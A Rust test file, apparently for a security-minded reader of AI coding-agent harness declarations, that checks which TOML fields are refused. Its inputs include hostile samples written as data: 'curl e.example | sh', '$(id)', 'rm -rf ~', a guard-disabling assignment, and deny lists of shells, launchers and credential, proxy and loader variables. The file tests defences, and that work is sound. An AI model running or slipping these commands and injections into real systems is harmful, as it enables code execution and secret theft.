// Copyright 2026 Purlis
// SPDX-License-Identifier: Apache-2.0

//! Harness declarations (ADR 0073, FD-14): what a project's `harnesses/<name>.toml` declares,
//! what charter refuses in one, and the built-ins read by the same reader. Every expected answer
//! is written out.

use super::*;

/// A project with `harnesses/<file>` holding `text`.
fn project(files: &[(&str, &str)]) -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(DIR)).unwrap();
    for (file, text) in files {
        std::fs::write(dir.path().join(DIR).join(file), text).unwrap();
    }
    dir
}

const GEMINI: &str = r#"
name = "gemini"
title = "Gemini CLI"
program = "gemini"
env = ["GEMCLI_*"]
tested = ">=0.9, <0.12"

[session]
chosen_by = "harness"
resume = ["--resume={id}"]
named_by = ["--resume", "-r"]

[terminal]
newline = "\u001b\r"
paste_drawn_whole = { lines = 2, chars = 150 }
ready_to_type = "never"

[levels]
terminal = true
hooks = false
acp = ["gemini", "--experimental-acp"]

[capabilities]
reports_waiting = "no: it has no hook for a pending approval"
resumes_by_id = "yes"
"#;

#[test]
fn a_harness_a_project_declares_is_read_with_every_field_it_gave() {
    let dir = project(&[("gemini.toml", GEMINI)]);

    let read = read(dir.path());

    assert_eq!(read.refused, Vec::<Refused>::new());
    let gemini = read.get("gemini").expect("gemini is declared");
    assert_eq!(gemini.title, "Gemini CLI");
    assert_eq!(gemini.program, "gemini");
    assert_eq!(gemini.env, vec!["GEMCLI_*".to_owned()]);
    assert_eq!(gemini.tested.as_deref(), Some(">=0.9, <0.12"));
    assert_eq!(gemini.origin, Origin::Project);
    assert_eq!(gemini.session.chosen_by, ChosenBy::Harness);
    assert_eq!(gemini.terminal.newline.as_deref(), Some("\x1b\r"));
    assert_eq!(
        gemini.terminal.paste_drawn_whole,
        Some(DrawnWhole {
            lines: 2,
            chars: 150
        })
    );
    assert_eq!(gemini.terminal.ready_to_type, ReadyToType::Never);
    assert!(gemini.levels.terminal);
    assert!(!gemini.levels.hooks);
    assert_eq!(
        gemini.levels.acp,
        Some(vec!["gemini".to_owned(), "--experimental-acp".to_owned()])
    );
    assert_eq!(
        gemini.capability("reports_waiting"),
        Answer::No("it has no hook for a pending approval".to_owned())
    );
    assert_eq!(gemini.capability("resumes_by_id"), Answer::Yes);
}

/// The one sentence `text`, as `harnesses/<name>.toml`, is refused with.
fn refused(name: &str, text: &str) -> String {
    let dir = project(&[(&format!("{name}.toml"), text)]);
    let read = read(dir.path());
    assert!(read.get(name).is_none() || read.get(name).unwrap().origin == Origin::BuiltIn);
    assert_eq!(read.refused.len(), 1, "{:?}", read.refused);
    assert_eq!(read.refused[0].file, format!("harnesses/{name}.toml"));
    read.refused[0].reason.clone()
}

#[test]
fn the_least_a_terminal_only_harness_declares_is_its_name_and_its_program() {
    let dir = project(&[("aider.toml", "name = \"aider\"\nprogram = \"aider\"\n")]);

    let aider = read(dir.path()).get("aider").cloned().expect("declared");

    assert_eq!(aider.title, "aider");
    assert_eq!(aider.session.chosen_by, ChosenBy::Harness);
    assert_eq!(aider.session.resume, None);
    assert_eq!(aider.terminal.ready_to_type, ReadyToType::Never);
    assert!(aider.levels.terminal && !aider.levels.hooks && !aider.has_adapter());
    // Silence never reads as yes.
    assert_eq!(aider.capability("reports_waiting"), Answer::Unknown);
    assert!(!aider.capability("reports_waiting").holds());
}

#[test]
fn a_program_is_a_bare_name_and_never_a_path_or_a_shell_string() {
    for program in [
        "/usr/bin/gemini",
        "./gemini",
        "~/bin/gemini",
        "gemini --yolo",
        "-x",
        "",
    ] {
        let why = refused(
            "gemini",
            &format!("name = \"gemini\"\nprogram = {program:?}\n"),
        );
        assert!(why.contains("not a bare program name"), "{program}: {why}");
    }
}

#[test]
fn a_template_takes_id_and_name_and_nothing_else() {
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nresume = [\"--resume={home}\"]\n",
    );
    assert!(why.contains("a placeholder purlis does not fill"), "{why}");
}

#[test]
fn a_session_purlis_chooses_hands_its_id_over_and_one_the_harness_chooses_does_not() {
    // "charter" is the old spelling of "purlis" and is read the same (#1756).
    for word in ["purlis", "charter"] {
        let purlis = refused(
            "gemini",
            &format!(
                "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nchosen_by = \"{word}\"\n"
            ),
        );
        assert_eq!(
            purlis,
            "harnesses/gemini.toml's [session] says chosen_by = \"purlis\" and [session] new \
             hands over no {id} — say how the id is handed over, or write chosen_by = \
             \"harness\".",
            "{word}"
        );
    }
    let harness = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nnew = [\"--id={id}\"]\n",
    );
    assert_eq!(
        harness,
        "harnesses/gemini.toml's [session] new hands over an {id}, and chosen_by is \"harness\" \
         — purlis chooses an id only for a harness that takes one. Write chosen_by = \"purlis\"."
    );
}

#[test]
fn chosen_by_purlis_is_the_word_and_charter_its_old_spelling_both_load() {
    // #1756: plane-format.md documents "purlis"; a declaration written before the rename says
    // "charter", and both mean purlis chooses the id.
    for word in ["purlis", "charter"] {
        let dir = project(&[(
            "gemini.toml",
            &format!(
                "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nchosen_by = \"{word}\"\nnew \
                 = [\"--session={{id}}\"]\n"
            ),
        )]);

        let read = read(dir.path());

        assert_eq!(read.refused, Vec::<Refused>::new(), "{word}");
        assert_eq!(
            read.get("gemini").unwrap().session.chosen_by,
            ChosenBy::Charter,
            "{word}"
        );
    }
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nchosen_by = \"me\"\n",
    );
    assert_eq!(
        why,
        "harnesses/gemini.toml's [session] chosen_by is me, and it is \"harness\" or \"purlis\". \
         Write one of them."
    );
}

#[test]
fn a_resume_template_names_the_id_it_resumes() {
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nresume = [\"--continue\"]\n",
    );
    assert!(why.contains("names no {id}"), "{why}");
}

#[test]
fn the_environment_is_the_harnesss_own_namespace_and_never_charters_or_a_credential() {
    for (entry, said) in [
        ("CHARTER_*", "purlis's own variables"),
        // The product's variables under either name (RN-2d): `PURLIS_*` is the canonical one.
        ("PURLIS_*", "purlis's own variables"),
        ("PURLIS_ROOT", "purlis's own variables"),
        ("PUR*", "capitals, digits and '_'"),
        ("CHA*", "capitals, digits and '_'"),
        ("C*", "capitals, digits and '_'"),
        ("GEMINI_API_KEY", "named like a credential"),
        ("GEMINI_TOKEN_*", "named like a credential"),
        ("*", "capitals, digits and '_'"),
        ("gemini_*", "capitals, digits and '_'"),
        ("CLAUDE_CODE_SANDBOXED", "a harness's internal variable"),
    ] {
        let why = refused(
            "gemini",
            &format!("name = \"gemini\"\nprogram = \"gemini\"\nenv = [{entry:?}]\n"),
        );
        assert!(why.contains(said), "{entry}: {why}");
    }
}

#[test]
fn a_project_declaration_cannot_say_it_has_hooks() {
    // V24c: level 2 always needs charter code.
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[levels]\nhooks = true\n",
    );
    assert!(
        why.contains("level 2 needs an adapter purlis ships"),
        "{why}"
    );
}

#[test]
fn a_harness_with_no_hooks_cannot_wait_for_one_to_be_typed_into() {
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[terminal]\nready_to_type = \"on-start\"\n",
    );
    assert!(why.contains("waits for a hook"), "{why}");
}

#[test]
fn a_capability_is_yes_no_with_a_reason_or_unknown() {
    let bare_no = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[capabilities]\nreports_waiting = \"no\"\n",
    );
    assert!(bare_no.contains("\"no: <the reason>\""), "{bare_no}");
    let unknown_key = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[capabilities]\nreports_wating = \"yes\"\n",
    );
    assert!(
        unknown_key.contains("not a harness capability purlis reads"),
        "{unknown_key}"
    );
    let resumes = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\n[capabilities]\nresumes_by_id = \"yes\"\n",
    );
    assert!(resumes.contains("has no resume"), "{resumes}");
}

#[test]
fn a_key_charter_does_not_read_refuses_the_declaration() {
    let why = refused(
        "gemini",
        "name = \"gemini\"\nprogram = \"gemini\"\ncommand = \"gemini --yolo\"\n",
    );
    assert!(
        why.contains("not a harness declaration purlis reads"),
        "{why}"
    );
}

#[test]
fn a_file_is_named_after_the_harness_it_declares() {
    let dir = project(&[("gemini.toml", "name = \"other\"\nprogram = \"gemini\"\n")]);
    let read = read(dir.path());
    assert!(read.get("other").is_none() && read.get("gemini").is_none());
    assert!(
        read.refused[0]
            .reason
            .contains("Rename the file other.toml"),
        "{:?}",
        read.refused
    );
}

#[test]
fn a_project_never_takes_a_built_ins_name() {
    // ADR 0073 §5: a built-in's declaration decides how its chats are armed.
    let why = refused("claude", "name = \"claude\"\nprogram = \"my-claude\"\n");
    assert!(why.contains("a harness purlis ships"), "{why}");
    let read = read(project(&[("claude.toml", "name = \"claude\"\nprogram = \"x\"\n")]).path());
    assert_eq!(read.get("claude").unwrap().program, "claude");
}

#[test]
fn a_file_that_is_not_toml_is_not_a_declaration_and_a_link_is_not_followed() {
    let dir = project(&[("README.md", "# harnesses\n")]);
    let elsewhere = tempfile::tempdir().unwrap();
    std::fs::write(
        elsewhere.path().join("x.toml"),
        "name = \"x\"\nprogram = \"x\"\n",
    )
    .unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(
        elsewhere.path().join("x.toml"),
        dir.path().join(DIR).join("x.toml"),
    )
    .unwrap();

    let read = read(dir.path());

    assert!(read.get("x").is_none());
    #[cfg(unix)]
    assert!(
        read.refused[0].reason.contains("could not be read"),
        "{:?}",
        read.refused
    );
}

#[test]
fn a_project_with_no_harnesses_directory_has_the_built_ins_and_nothing_refused() {
    let dir = tempfile::tempdir().unwrap();
    let read = read(dir.path());
    let names: Vec<&str> = read.declared.iter().map(|d| d.name.as_str()).collect();
    assert_eq!(names, ["claude", "opencode", "codex"]);
    assert!(read.refused.is_empty());
}

#[test]
fn a_declaration_fills_its_templates_and_knows_the_operators_own_session_flags() {
    let dir = project(&[(
        "gemini.toml",
        "name = \"gemini\"\nprogram = \"gemini\"\n[session]\nchosen_by = \"charter\"\nnew = [\"--session={id}\", \"--title={name}\"]\nresume = [\"--resume={id}\"]\nnamed_by = [\"--resume\"]\n",
    )]);
    let gemini = read(dir.path()).get("gemini").cloned().unwrap();
    let id = SessionId::new("abc-1").unwrap();

    assert_eq!(
        gemini.new_session_argv(&id, "ide.7"),
        ["--session=abc-1", "--title=ide.7"]
    );
    assert_eq!(
        gemini.resume_argv(&id, "ide.7"),
        Some(vec!["--resume=abc-1".to_owned()])
    );
    assert!(gemini.session_named_in(&["--resume=x".to_owned()]));
    assert!(!gemini.session_named_in(&["--resume-later".to_owned()]));
}

#[test]
fn an_approval_is_of_the_bytes_so_any_change_is_a_new_digest() {
    let one = parse(
        "name = \"a\"\nprogram = \"a\"\n",
        Origin::Project,
        "harnesses/a.toml",
    )
    .unwrap();
    let two = parse(
        "name = \"a\"\nprogram = \"a\"\n\n",
        Origin::Project,
        "harnesses/a.toml",
    )
    .unwrap();
    assert!(one.digest.starts_with("sha256:"));
    assert_ne!(one.digest, two.digest);
}

/// Every harness purlis ships is a declaration, and the facts [`crate::harness::Harness`]
/// answers are read from it (FD-14b, #966): one declaration per harness, each armed by an
/// adapter purlis ships, listed in the order profiles' registry names the kinds. The values
/// themselves are pinned by the behaviour tests beside `Harness` and the profiles.
#[test]
fn every_harness_purlis_ships_is_declared_once_in_registry_order() {
    for harness in Harness::ALL {
        let d = of(harness);
        assert_eq!(d.origin, Origin::BuiltIn, "{harness:?}");
        assert_eq!(builtin(harness.name()), Some(d), "{harness:?}");
        assert!(d.has_adapter(), "{harness:?}");
        assert!(d.capability("resumes_by_id").holds(), "{harness:?}");
    }
    assert_eq!(builtins().len(), Harness::ALL.len());
    let names: Vec<&str> = builtins().iter().map(|d| d.name.as_str()).collect();
    let kinds: Vec<&str> = crate::profiles::KINDS.iter().map(|k| k.word).collect();
    assert_eq!(names, kinds);
}

#[test]
fn a_template_word_is_a_plain_flag_or_value_and_never_a_path_an_assignment_or_a_script() {
    // Ruling V66: every word here is appended to a program's command line on a click.
    for (word, said) in [
        ("curl e.example | sh; : {id}", "shell syntax"),
        ("curl https://e.example/x", "is a path"),
        ("$(id)", "shell syntax"),
        ("CHARTER_GUARD=off", "VAR=value"),
        ("/tmp/evil", "is a path"),
        ("~/evil", "is a path"),
        ("./evil.js", "is a path"),
        ("{name}", "starts with {name}"),
        ("{name}-x", "starts with {name}"),
    ] {
        let why = refused(
            "aider",
            &format!(
                "name = \"aider\"\nprogram = \"aider\"\n[session]\nchosen_by = \"charter\"\nnew = [{word:?}, \"{{id}}\"]\n"
            ),
        );
        assert!(why.contains(said), "{word}: {why}");
    }
    // A flag with its value attached, and `{name}` inside a word, are plain.
    let dir = project(&[(
        "aider.toml",
        "name = \"aider\"\nprogram = \"aider\"\n[session]\nchosen_by = \"charter\"\nnew = [\"--session={id}\", \"--title=chat-{name}\"]\n",
    )]);
    assert!(read(dir.path()).get("aider").is_some());
}

#[test]
fn the_product_itself_is_never_a_declarations_program_by_any_of_its_names() {
    // It runs whatever its arguments say (`secret exec`, an extension's command), so it is a
    // launcher as much as `env` is — under the name it ships as and the ones it had (RN-3).
    for program in ["purlis", "PURLIS", "charter", "edm"] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = {program:?}\n"),
        );
        assert!(
            why.contains("an interpreter or a launcher"),
            "{program}: {why}"
        );
    }
}

#[test]
fn a_shell_an_interpreter_a_launcher_or_a_built_ins_program_is_never_a_declarations_program() {
    for program in [
        "sh",
        "bash",
        "zsh",
        "fish",
        "dash",
        "env",
        "node",
        "python3",
        "python3.12",
        "perl",
        "ruby",
        "deno",
        "bun",
        "npx",
        "uvx",
        "osascript",
        "SH",
        "claude",
        "codex",
        "opencode",
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = {program:?}\n"),
        );
        assert!(
            why.contains("an interpreter or a launcher") || why.contains("a harness purlis ships"),
            "{program}: {why}"
        );
    }
}

#[test]
fn an_acp_command_takes_the_same_rules_as_a_program_and_its_templates() {
    for acp in [
        r#"["node", "agent.js"]"#,
        r#"["aider-acp", "/tmp/x"]"#,
        r#"["aider-acp", "A=b"]"#,
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = \"aider\"\n[levels]\nacp = {acp}\n"),
        );
        assert!(why.contains("[levels] acp"), "{acp}: {why}");
    }
}

#[test]
fn a_namespace_never_reaches_a_family_of_credentials_or_what_a_process_loads() {
    for entry in [
        "AWS_*",
        "GITHUB_*",
        "GITHUB_TOKEN",
        "OPENAI_*",
        "ANTHROPIC_*",
        "GOOGLE_*",
        "AZURE_*",
        "GEMINI_*",
        "KUBECONFIG",
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = \"aider\"\nenv = [{entry:?}]\n"),
        );
        assert!(why.contains("family of credentials"), "{entry}: {why}");
    }
    for entry in [
        "LD_*",
        "LD_PRELOAD",
        "DYLD_*",
        "NODE_OPTIONS",
        "PYTHONPATH",
        "PATH",
        "GIT_*",
        "GIT_SSH_COMMAND",
        "JDK_JAVA_OPTIONS",
        "BASH_FUNC_*",
        "XDG_CONFIG_HOME",
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = \"aider\"\nenv = [{entry:?}]\n"),
        );
        assert!(why.contains("loads, runs or finds"), "{entry}: {why}");
    }
}

#[test]
fn a_namespace_never_reaches_what_a_chats_tools_trust_connect_through_or_run() {
    // #1013: TLS trust, proxies, the SSH agent and the programs a tool runs for you.
    for entry in [
        // TLS trust.
        "SSL_CERT_FILE",
        "SSL_CERT_DIR",
        "NODE_EXTRA_CA_CERTS",
        "REQUESTS_CA_BUNDLE",
        "CURL_CA_BUNDLE",
        "NODE_TLS_REJECT_UNAUTHORIZED",
        "SSL_*",
        // Proxies, in any case.
        "HTTP_PROXY",
        "HTTPS_PROXY",
        "ALL_PROXY",
        "NO_PROXY",
        "HTTP_*",
        // The SSH agent.
        "SSH_AUTH_SOCK",
        "SSH_AGENT_PID",
        "SSH_ASKPASS",
        "SSH_*",
        // Programs a tool runs.
        "PAGER",
        "EDITOR",
        "VISUAL",
        "BROWSER",
        "CC",
        "CXX",
        "RUSTC_WRAPPER",
        "LESSOPEN",
        "RUSTC_*",
        // Train 79 review: the tool-prefixed spellings of the same classes.
        "YARN_HTTPS_PROXY",
        "PIP_PROXY",
        "CARGO_HTTP_PROXY",
        "CARGO_HTTP_CAINFO",
        "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER",
        "CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER",
        "GOFLAGS",
        "GOPROXY",
        "GOINSECURE",
        "PYTHONHTTPSVERIFY",
        "CURL_HOME",
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = \"aider\"\nenv = [{entry:?}]\n"),
        );
        assert!(why.contains("trust, connect through or"), "{entry}: {why}");
    }
    // A lowercase spelling is never a namespace entry at all, and a whole tool's prefix is
    // refused, whichever of its variables refuses it first (a credential or a steer).
    for entry in [
        "https_proxy",
        "http_proxy",
        "npm_config_https_proxy",
        "NPM_*",
        "CARGO_*",
        "DOCKER_HOST",
        "NPM_CONFIG_HTTPS_PROXY",
        "NPM_CONFIG_CAFILE",
        "NPM_CONFIG_STRICT_SSL",
        "NPM_CONFIG_SCRIPT_SHELL",
    ] {
        refused(
            "aider",
            &format!("name = \"aider\"\nprogram = \"aider\"\nenv = [{entry:?}]\n"),
        );
    }
}

#[test]
fn a_name_that_only_resembles_a_trust_proxy_agent_or_runner_variable_still_passes() {
    // D-1013-3: the classes are the exact names programs read (and a prefix only where every
    // name under it is the class's), so a harness's own look-alikes stay its own.
    for entry in [
        "AIDER_PROXY_MODE",
        "AIDER_HTTP_PROXY",
        "AIDER_*",
        "EDITOR_THEME",
        "PAGERDUTY_SERVICE",
        "CCACHE_DIR",
        "SSHY_*",
        "SSL",
        "CARGO_HOME_HINT",
        "GO_VERSION",
        "DOCKERFILE_NAME",
    ] {
        let dir = project(&[(
            "aider.toml",
            &format!("name = \"aider\"\nprogram = \"aider\"\nenv = [{entry:?}]\n"),
        )]);
        let read = read(dir.path());
        assert!(read.refused.is_empty(), "{entry}: {:?}", read.refused);
        assert_eq!(
            read.get("aider").expect("declared").env,
            vec![entry.to_owned()]
        );
    }
}

/// `new` holding `words` (TOML array items), in a project's declaration.
fn with_new(words: &str) -> String {
    format!(
        "name = \"aider\"\nprogram = \"aider\"\n[session]\nchosen_by = \"charter\"\nnew = [{words}, \"--session={{id}}\"]\n"
    )
}

#[test]
fn every_word_after_the_program_has_an_allowed_shape_and_nothing_else_is_taken() {
    // Ruling V66c: a flag, `--flag=<plain value>`, a placeholder inside a flag's value, or a
    // lowercase subcommand with no dot. The second review's probes, each refused.
    for word in [
        "/tmp/a",
        "CHARTER_X=off",
        "a;b",
        "{name}",
        "-{name}",
        "--{name}",
        "{id}{name}",
        "{id}",
        "--flag=/abs",
        "--cfg=~/x",
        "--x=..",
        "--cfg=.hidden",
        "--a=b@c",
        "rel.js",
        "-I.",
        "-c.foo",
        "@args.txt",
        "file:rel",
        "%2F",
        "Exec",
        "--=x",
        "--x=",
        "sh",
        "claude",
        "--exec=sh",
        "--run=python3",
    ] {
        let why = refused("aider", &with_new(&format!("{word:?}")));
        assert!(why.contains("[session] new holds"), "{word}: {why}");
    }
    for word in [
        "-c",
        "--yolo",
        "--title={name}",
        "--cfg=rel.toml",
        "--remote=example.com:8080",
        "--u=http:x",
        "exec",
        "run",
        "resume",
        "2fa",
    ] {
        let dir = project(&[("aider.toml", &with_new(&format!("{word:?}")))]);
        let read = read(dir.path());
        assert!(read.get("aider").is_some(), "{word}: {:?}", read.refused);
    }
}

#[test]
fn a_resume_and_an_acp_command_take_the_same_shapes() {
    let resume = refused(
        "aider",
        "name = \"aider\"\nprogram = \"aider\"\n[session]\nresume = [\"--resume\", \"{id}\"]\n",
    );
    assert!(resume.contains("[session] resume holds"), "{resume}");
    for acp in [
        r#"["aider", "/a"]"#,
        r#"["aider", "{name}"]"#,
        r#"["aider", "rel.js"]"#,
        r#"["aider", "sh"]"#,
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = \"aider\"\n[levels]\nacp = {acp}\n"),
        );
        assert!(why.contains("[levels] acp"), "{acp}: {why}");
    }
    let dir = project(&[(
        "aider.toml",
        "name = \"aider\"\nprogram = \"aider\"\n[session]\nresume = [\"--resume={id}\"]\n[levels]\nacp = [\"aider\", \"acp\", \"--stdio\"]\n",
    )]);
    assert!(read(dir.path()).get("aider").is_some());
}

#[test]
fn the_launchers_the_second_review_found_are_refused_as_a_program() {
    for program in [
        "arch",
        "caffeinate",
        "xcrun",
        "stdbuf",
        "chrt",
        "taskset",
        "strace",
        "sandbox-exec",
        "tmux",
        "screen",
        "go",
        "cargo",
        "swift",
        "Rscript",
        "julia",
        "gdb",
        "lldb",
        "vim",
        "emacs",
        "git",
        "just",
        "bundle",
        "rake",
        "poetry",
        "pipenv",
        "conda",
        "mise",
        "asdf",
        "direnv",
        "tsx",
        "ts-node",
        "qjs",
        "jshell",
        "groovy",
        "scala",
        "kotlin",
        "elixir",
        "erl",
        "ghci",
        "racket",
        "guile",
        "sbcl",
        "ocaml",
        "dotnet",
        "bunx",
        "corepack",
        "volta",
        "fnm",
        "nvm",
        "rbenv",
        "pyenv",
        "find",
        "ex",
        "zx",
        "nushell",
        "ion",
        "rc",
        "yash",
        "osh",
        "oil",
        "pwsh-preview",
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = {program:?}\n"),
        );
        assert!(
            why.contains("an interpreter or a launcher"),
            "{program}: {why}"
        );
    }
}

#[test]
fn a_launcher_under_a_versioned_or_suffixed_name_is_refused_as_the_launcher() {
    // #1119 (D-1119-1): a name check matched only the bare word, so `ksh93`, `tclsh8.6` or
    // `bash.exe` passed while `ksh`, `tclsh` and `bash` were refused.
    for program in [
        "ksh93",
        "tclsh8.6",
        "wish8.6",
        "guile3.0",
        "java17",
        "gawk5",
        "deno2",
        "luajit-2.1",
        "busybox1.36",
        "bash.exe",
        "sh.exe.",
        "env.exe..",
        "SH.EXE",
        "env.exe",
        "codex.exe",
        "opencode-1.18",
    ] {
        let why = refused(
            "aider",
            &format!("name = \"aider\"\nprogram = {program:?}\n"),
        );
        assert!(
            why.contains("an interpreter or a launcher") || why.contains("a harness purlis ships"),
            "{program}: {why}"
        );
    }
}

#[test]
fn a_harness_whose_name_only_ends_in_a_version_is_still_its_own_program() {
    for program in ["aider2", "gemini-2.5", "goose1", "crush"] {
        let text = format!("name = \"aider\"\nprogram = {program:?}\n");
        let dir = project(&[("aider.toml", text.as_str())]);
        assert!(read(dir.path()).get("aider").is_some(), "{program}");
    }
}

#[test]
fn a_flags_value_takes_no_percent_sign_and_no_drive_letter() {
    // Some programs decode `%2F` into a path, or read `C:` as a drive. No measured harness
    // passes a `%`, so the value charset has none.
    for word in [
        "--x=%2F",
        "--x=%2f",
        "--x=%5C",
        "--x=%5c",
        "--x=%2E",
        "--x=%2e",
        "--n=10%",
        "--x=C:",
        "--x=c:foo",
        "--x=Z:rel",
    ] {
        let why = refused("aider", &with_new(&format!("{word:?}")));
        assert!(why.contains("[session] new holds"), "{word}: {why}");
    }
    let dir = project(&[("aider.toml", &with_new("\"--remote=example.com:8080\""))]);
    assert!(read(dir.path()).get("aider").is_some());
}

/// A declaration whose `field = value` line is the TOML `line`, under `[table]` when it is one.
fn declaring(line: &str) -> String {
    format!("name = \"gemini\"\nprogram = \"gemini\"\n{line}\n")
}

#[test]
fn a_title_a_window_draws_is_one_short_line_with_nothing_invisible_in_it() {
    // HP-19: the title is the card's label, on the picker and the tab strip.
    for (line, what) in [
        ("title = \"Gem\\u202Eini\"", "a bidi override"),
        ("title = \"Gem\\u200Bini\"", "a zero-width space"),
        ("title = \"Gem\\u001b[31mini\"", "an escape"),
        ("title = \"\"\"Gem\nini\"\"\"", "a newline"),
        (&format!("title = \"{}\"", "G".repeat(61)), "61 characters"),
    ] {
        let why = refused("gemini", &declaring(line));
        assert!(
            why.starts_with("harnesses/gemini.toml's title")
                && why.contains("one line of at most 60 characters"),
            "{what}: {why}"
        );
    }
    let fine = project(&[(
        "gemini.toml",
        &declaring(&format!("title = \"{}\"", "G".repeat(60))),
    )]);
    assert!(read(fine.path()).refused.is_empty());
}

#[test]
fn a_project_title_may_not_be_a_harness_charter_ships() {
    let why = refused("gemini", &declaring("title = \"claude code\""));
    assert!(
        why.starts_with("harnesses/gemini.toml's title") && why.contains("purlis ships"),
        "{why}"
    );
}

#[test]
fn the_versions_a_declaration_was_measured_on_are_one_short_line() {
    for line in [
        "tested = \"1.0\\u2066\"".to_owned(),
        format!("tested = \"{}\"", "1".repeat(81)),
    ] {
        let why = refused("gemini", &declaring(&line));
        assert!(
            why.starts_with("harnesses/gemini.toml's tested")
                && why.contains("one line of at most 80 characters"),
            "{line}: {why}"
        );
    }
}

#[test]
fn a_no_s_reason_is_one_line_of_at_most_200_characters() {
    for (reason, what) in [
        ("it\\nhas none".to_owned(), "a newline"),
        ("it has \\u202Enone".to_owned(), "a bidi override"),
        ("x".repeat(10_000), "10 KB"),
    ] {
        let why = refused(
            "gemini",
            &declaring(&format!(
                "[capabilities]\nreports_waiting = \"no: {reason}\""
            )),
        );
        assert!(
            why.starts_with("harnesses/gemini.toml's [capabilities] reports_waiting")
                && why.contains("one line of at most 200 characters"),
            "{what}: {why}"
        );
    }
}

#[test]
fn a_project_never_takes_the_name_purlis_gives_a_harness_it_ships() {
    // A chat's harness word (`PURLIS_HARNESS`, a profile's harness) is read as the built-in
    // by that name, so a declaration under it would be armed as one.
    let why = refused(
        "claude-code",
        "name = \"claude-code\"\nprogram = \"gemini\"\n",
    );
    assert_eq!(
        why,
        "harnesses/claude-code.toml declares 'claude-code', which is the name purlis gives a \
         harness it ships — a chat on it would be taken for that harness and armed as one. \
         Give it a name of its own."
    );
    for name in crate::guardcmd::HARNESSES {
        let read = read(
            project(&[(
                &format!("{name}.toml"),
                &format!("name = \"{name}\"\nprogram = \"gemini\"\n"),
            )])
            .path(),
        );
        assert_eq!(read.refused.len(), 1, "{name}: {:?}", read.refused);
        assert!(
            read.get(name)
                .is_none_or(|found| found.origin == Origin::BuiltIn),
            "{name}"
        );
    }
}

#[test]
fn a_terminals_newline_is_one_of_the_keys_a_terminal_reads_as_enter() {
    for newline in [
        "\\r",
        "\\n",
        "\\r\\n",
        "\\u001b\\r",
        "\\\\\\r",
        "\\u001b[13;2u",
    ] {
        let dir = project(&[(
            "gemini.toml",
            &declaring(&format!("[terminal]\nnewline = \"{newline}\"")),
        )]);
        let read = read(dir.path());
        assert!(read.refused.is_empty(), "{newline}: {:?}", read.refused);
        assert!(read.get("gemini").unwrap().terminal.newline.is_some());
    }
    for newline in [
        "x",
        "\\r\\r",
        "\\u001b[2~",
        "rm -rf ~\\r",
        "\\u0003",
        "\\t",
        "\\u001b[13;5u",
        "\\u001b[13;2u\\r",
    ] {
        let why = refused(
            "gemini",
            &declaring(&format!("[terminal]\nnewline = \"{newline}\"")),
        );
        assert!(
            why.starts_with("harnesses/gemini.toml's [terminal] newline is ")
                && why.ends_with(
                    "which is not one of the keys a terminal reads as a new line: \"\\r\", \
                     \"\\n\", \"\\r\\n\", \"\\u001b\\r\", \"\\\\\\r\" or \"\\u001b[13;2u\". \
                     Write one of them, or remove the line and the chat keeps the terminal's \
                     own Enter."
                ),
            "{newline}: {why}"
        );
    }
}

/// #967: a chat on a harness a project declares is typed into by its own declaration, as a
/// built-in's is by its own: when, from `ready_to_type`, and whether a paste is drawn whole,
/// from `paste_drawn_whole`, judged by the one rule every harness is judged by.
#[test]
fn a_declared_harness_is_typed_into_by_its_own_terminal_facts() {
    let quiet = parse(
        "name = \"shelly\"\ntitle = \"Shelly\"\nprogram = \"shelly\"\n[terminal]\n\
         ready_to_type = \"raw-and-quiet\"\npaste_drawn_whole = { lines = 2, chars = 20 }\n",
        Origin::Project,
        "harnesses/shelly.toml",
    )
    .unwrap();
    let never = parse(GEMINI, Origin::Project, "harnesses/gemini.toml").unwrap();
    let unmeasured = parse(
        "name = \"plain\"\nprogram = \"plain\"\n[terminal]\nready_to_type = \"raw-and-quiet\"\n",
        Origin::Project,
        "harnesses/plain.toml",
    )
    .unwrap();

    assert_eq!(
        quiet.ready_to_type(),
        Some(crate::harness::ReadyToType::WhenRawAndQuiet)
    );
    assert_eq!(never.ready_to_type(), None);
    assert_eq!(quiet.why_drawn_as_a_placeholder("one line"), None);
    // One line only, whatever it declares: a line break may be its Enter.
    assert_eq!(
        quiet.why_drawn_as_a_placeholder("one\ntwo").as_deref(),
        Some(
            "Shelly is typed into only a prompt on one line, as purlis cannot tell that it takes \
             a paste whole and a line break could send what is above it, and this one is 2 lines"
        )
    );
    assert_eq!(
        quiet
            .why_drawn_as_a_placeholder("twenty-one characters")
            .as_deref(),
        Some("Shelly draws a paste over 20 characters as a placeholder, and this one is 21")
    );
    // A declaration that measured no limit limits nothing but the line.
    assert_eq!(
        unmeasured.why_drawn_as_a_placeholder(&"x".repeat(5000)),
        None
    );
    assert!(unmeasured.why_drawn_as_a_placeholder("x\ny").is_some());
}

/// Every built-in harness is typed into by its declaration's facts and nothing else: what
/// [`Harness`] answers is what its declaration answers.
#[test]
fn a_built_in_is_typed_into_by_the_same_rule_as_a_declared_harness() {
    let long = "a line\n".repeat(5);
    for harness in Harness::ALL {
